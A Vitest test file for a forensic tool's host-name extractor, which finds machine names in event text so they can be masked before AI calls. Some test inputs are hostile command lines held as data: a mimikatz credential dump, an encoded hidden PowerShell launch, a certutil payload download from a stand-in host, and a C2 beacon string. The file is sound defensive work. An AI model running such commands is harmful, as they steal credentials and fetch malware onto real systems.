import { describe, expect, it } from "vitest";
import {
  descriptionHostNames,
  excerptRoster,
  NOT_A_HOST,
} from "../../../src/analysis/ai/watson/rowTextHosts.js";
import { rosterOf } from "../../../src/analysis/ai/watson/superRoster.js";
import type { ForensicEvent } from "../../../src/analysis/stateTypes.js";

// Task 3: a host named only in a raw row's or a paste's free text joins the masking roster. Rule 1
// reads the value after a host label; rule 2 finds an uppercase machine name with a hyphen and a digit.
// A false positive hides evidence in every later AI call, so the negative list is part of the contract.

const row = (over: Partial<ForensicEvent>): ForensicEvent => ({
  id: "a",
  timestamp: "2026-01-01T10:00:00Z",
  description: "rclone",
  severity: "Info",
  mitreTechniques: [],
  relatedFindingIds: [],
  sourceScreenshots: [],
  ...over,
});

describe("descriptionHostNames", () => {
  it.each([
    [
      "An account was logged on. Workstation Name: WS-FAKE01 Source Network Address: 192.0.2.10",
      ["WS-FAKE01"],
    ],
    ["Logon from WS-FAKE01 to SRV-FAKE-02.", ["WS-FAKE01", "SRV-FAKE-02"]],
    ["Workstation Name: fakepc", ["fakepc"]],
    ["Workstation Name: fake-pc", ["fake-pc"]],
    ["Workstation Name: fakepc7", ["fakepc7"]],
    ['Computer="ws-fake03.example.com"', ["ws-fake03.example.com"]],
    ["Host Name: files.corp.internal", ["files.corp.internal", "files"]],
    ["DESKTOP-FAKE7Q2 started", ["DESKTOP-FAKE7Q2"]],
    ["Copied to DEV-01, FIN-02 and S1-DC01", ["DEV-01", "FIN-02", "S1-DC01"]],
    ["Workstation Name: fake-pc.", ["fake-pc"]],
    ["host=WS-FAKE01:445", ["WS-FAKE01"]],
    ["New computer WIN-7Q2K3J9LMN joined", ["WIN-7Q2K3J9LMN"]],
    ["Share SRV-SMB01 mounted", ["SRV-SMB01"]],
  ])("finds the host in %s", (text, hosts) => {
    expect(descriptionHostNames(text)).toEqual(expect.arrayContaining(hosts));
    expect(descriptionHostNames(text)).not.toContain("fake-pc.");
  });

  it.each([
    "Exploit for CVE-2021-44228 and MS17-010",
    "KB5031234 installed",
    "T1059 via SHA-256 and AES-256",
    "x86-64 build, UTF-8 text",
    "SID S-1-5-21-1111-2222-3333-500",
    "APT-29 tooling",
    "Port TCP-445, offset UTC-5, status HTTP-200, EID-4624",
    "Workstation Name: -",
    "Workstation Name: N/A",
    "Workstation Name: 192.0.2.10",
    "C:\\Tools\\WS-FAKE01\\run.exe",
    "https://cdn.example.com/WS-FAKE01-x.js",
    "mimikatz.exe sekurlsa::logonpasswords",
    "VERY-LONG-NAME-FAKE-0001",
    // Review I1: a blank labelled value never takes the next label or a plain word.
    "Workstation Name:  Source Network Address: -",
    "Workstation Name: \nSource Network Address: 192.0.2.1",
    "Computer: Yes",
    "host: the attacker",
    "Workstation Name: Source: 192.0.2.1",
    "Computer Name: no",
    "Host: ab",
    // Final review F1: a vendor, OS or placeholder word is no host, and COVID-19 is no machine name.
    "Computer: Microsoft",
    "Host Name: Windows",
    "Computer: Linux",
    "Host: www",
    "Server Name: Azure",
    "Device Name: Unknown",
    "Computer: True",
    "Cases of COVID-19 rose",
    // Review I2: crypto, encoding, protocol and platform identifiers stay readable.
    "Ticket encryption RC4-HMAC requested",
    "Decoded from UTF-16LE base64",
    "Signed with HMAC-SHA256 and DES-CBC-MD5",
    "Curve P-256 and P-384 keys, SHA3-256 digest",
    "Kerberos etype AES128-CTS, auth NTLM-V2",
    "Build for WIN-10 on X86-64 and AMD64-V2",
    "SMB2-1 then TLS-1 then KRB5-23",
  ])("finds no host in %s", (text) => {
    expect(descriptionHostNames(text)).toEqual([]);
  });

  it("returns each name once, and nothing for no text", () => {
    expect(descriptionHostNames("WS-FAKE01 then ws-fake01 then WS-FAKE01")).toEqual(["WS-FAKE01"]);
    expect(descriptionHostNames(undefined)).toEqual([]);
    expect(descriptionHostNames("")).toEqual([]);
  });

  it("gives the same answer on repeated calls (no regex state carried over)", () => {
    const text = "Logon from WS-FAKE01 to SRV-FAKE-02.";
    expect(descriptionHostNames(text)).toEqual(descriptionHostNames(text));
  });

  it("NOT_A_HOST matches whole identifier shapes only, never a host-name prefix", () => {
    for (const id of ["CVE-2021-44228", "MS17-010", "TCP-445", "S-1-5-21-1", "DEV-0537", "TA-505"]) {
      expect(NOT_A_HOST.test(id)).toBe(true);
    }
    for (const host of ["DEV-01", "FIN-02", "TA-01", "S1-DC01", "WS-FAKE01"]) {
      expect(NOT_A_HOST.test(host)).toBe(false);
    }
  });
});

describe("descriptionHostNames on a command line (review M1)", () => {
  it.each([
    ["mstsc /v:WS-FAKE01", ["WS-FAKE01"]],
    ["Invoke-Command -ComputerName WS-FAKE01 -ScriptBlock { whoami }", ["WS-FAKE01"]],
    ["nltest /server:SRV-FAKE-02 /dclist:example.com", ["SRV-FAKE-02"]],
  ])("finds the host in %s", (text, hosts) => {
    expect(descriptionHostNames(text)).toEqual(hosts);
  });

  it.each([
    "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
    "cmd.exe /c whoami /all",
    "chrome.exe --no-sandbox --disable-gpu",
    "openssl enc -AES-256-CBC -in a.bin",
    "certutil -urlcache -split -f https://cdn.example.com/WS-FAKE01.exe C:\\Temp\\a.exe",
  ])("finds no host in %s", (text) => {
    expect(descriptionHostNames(text)).toEqual([]);
  });
});

describe("no derived short label for a public FQDN (final review F1)", () => {
  it.each([
    ["GET / Host: www.google.com", "www.google.com", "www"],
    ["Host: login.microsoftonline.com", "login.microsoftonline.com", "login"],
    ["cs-host=api.github.com", "api.github.com", "api"],
    ["Hostname: mail.example.com", "mail.example.com", "mail"],
    ['Computer="ws-fake03.example.com"', "ws-fake03.example.com", "ws-fake03"],
  ])("%s gives the FQDN at most, never its first label", (text, fqdn, label) => {
    const names = descriptionHostNames(text).map((h) => h.toLowerCase());
    expect(names).not.toContain(label);
    expect(names.every((n) => n === fqdn)).toBe(true);
    const r = excerptRoster(text);
    expect((r?.hosts ?? []).map((h) => h.toLowerCase())).not.toContain(label);
  });

  it("a paste of an attacker FQDN stores the FQDN, not its machine-like label", () => {
    const r = excerptRoster("beacon to c2-node1.example.com every 60s");
    expect(r?.hosts).toContain("c2-node1.example.com");
    expect(r?.hosts.map((h) => h.toLowerCase())).not.toContain("c2-node1");
  });

  it("an internal FQDN still gives its label", () => {
    const r = excerptRoster("mounted \\\\files.corp.internal\\share");
    expect(r?.hosts.map((h) => h.toLowerCase())).toEqual(
      expect.arrayContaining(["files.corp.internal", "files"]),
    );
  });
});

describe("excerptRoster", () => {
  it("adds description hosts to the promptEntities names", () => {
    // promptEntities takes no user from a public-domain email (the anonymizer masks the address by
    // pattern), so the account also appears as DOMAIN\\user here.
    const r = excerptRoster("fake.user@example.com (CORP\\fake.user) logged on from WS-FAKE01");
    expect(r?.hosts.map((h) => h.toLowerCase())).toEqual(
      expect.arrayContaining(["ws-fake01", "example.com"]),
    );
    expect(r?.users).toEqual(expect.arrayContaining(["fake.user"]));
    expect(r?.ips).toEqual([]);
  });

  it("is undefined for text with no name, and for no text", () => {
    expect(excerptRoster("nothing to mask here")).toBeUndefined();
    expect(excerptRoster(undefined)).toBeUndefined();
  });
});

describe("rosterOf", () => {
  it("lists a host named only in a row's description", () => {
    expect(rosterOf([row({ description: "Logon from WS-FAKE01" })]).hosts).toContain("WS-FAKE01");
  });

  it("lists a host named only in a row's command line", () => {
    expect(rosterOf([row({ commandLine: "mstsc /v:WS-FAKE01" })]).hosts).toContain("WS-FAKE01");
  });

  it("lists no identifier shape from a description", () => {
    const r = rosterOf([row({ description: "Exploit for CVE-2021-44228 and MS17-010 over TCP-445" })]);
    expect(r.hosts).toEqual([]);
  });
});
